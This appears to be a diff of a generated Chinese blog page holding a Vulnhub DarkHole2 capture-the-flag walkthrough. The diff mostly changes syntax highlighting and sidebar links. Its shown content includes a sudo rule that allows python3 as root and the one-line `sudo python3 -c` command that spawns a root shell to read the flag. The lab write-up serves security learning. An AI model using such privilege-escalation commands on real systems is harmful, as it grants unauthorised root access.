+Matching Defaults entries <span class="token keyword">for</span> losy on darkhole:
+   env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
 
 User losy may run the following commands on darkhole:
-   (root) &#x2F;usr&#x2F;bin&#x2F;python3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><del>！！！python是世界上最美的语言</del> 提权，扫荡一下，找到第二个flag：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losy@darkhole:~$ sudo python3 -c &#39;import os;os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;      
-root@darkhole:~# cat root.txt
-DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+   <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /usr/bin/python3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><del>！！！python是世界上最美的语言</del> 提权，扫荡一下，找到第二个flag：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losy@darkhole:~$ <span class="token function">sudo</span> python3 -c <span class="token string">'import os;os.system("/bin/bash")'</span>      
+root@darkhole:~<span class="token comment"># cat root.txt</span>
+DarkHole<span class="token punctuation">&#123;</span><span class="token string">'Legend'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
 </blockquote>
 
   </div>
@@ -712,6 +712,20 @@ DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers
   </div>
 </article>
 <div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/36be6aa4.html" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">Prev</div>
+          
+            <div class="nav-title">Vulhub|Nacos集合 </div>
+          
+        </div>
+      </a>
+    </div>
   
   
     <div class="nav-item-next">
@@ -758,7 +772,7 @@ DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>36</span>
+    <span>37</span>
     <span>Posts</span>
   </a>
   <a 
@@ -770,7 +784,7 @@ DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>45</span>
+    <span>46</span>
     <span>Tags</span>
   </a>
 </div>
@@ -821,7 +835,7 @@ DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers
       <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
         <div class="categories-list-item">
           渗透测试
-          <span class="categories-list-item-badge">30</span>
+          <span class="categories-list-item-badge">31</span>
         </div>
       </a>
     
@@ -934,6 +948,12 @@ DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers
       </a>
     
       <a 
+        href="/tags/Nacos/" 
+        title="Nacos">
+        <div class="tags-list-item">Nacos</div>
+      </a>
+    
+      <a 
         href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
         title="SQL注入">
         <div class="tags-list-item">SQL注入</div>
@@ -955,12 +975,6 @@ DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers
         href="/tags/XXE/" 
         title="XXE">
         <div class="tags-list-item">XXE</div>
-      </a>
-    
-      <a 
-        href="/tags/Zabbix/" 
-        title="Zabbix">
-        <div class="tags-list-item">Zabbix</div>
       </a>
     
   </div>
@@ -996,6 +1010,11 @@ DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-05-07</div>
+        <a href="/36be6aa4.html"><div class="recent-posts-item-content">Vulhub|Nacos集合</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2022-04-20</div>
         <a href="/d0179d0c.html"><div class="recent-posts-item-content">Vulnhub|DarkHole2</div></a>
       </div>
@@ -1008,11 +1027,6 @@ DarkHole&#123;&#39;Legend&#39;&#125;<span aria-hidden="true" class="line-numbers
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2022-03-23</div>
         <a href="/7293a273.html"><div class="recent-posts-item-content">Vulhub|Zabbix集合</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-03-14</div>
-        <a href="/44cd77ef.html"><div class="recent-posts-item-content">Vulhub|PostgreSQL集合</div></a>
       </div>
     
   </div>
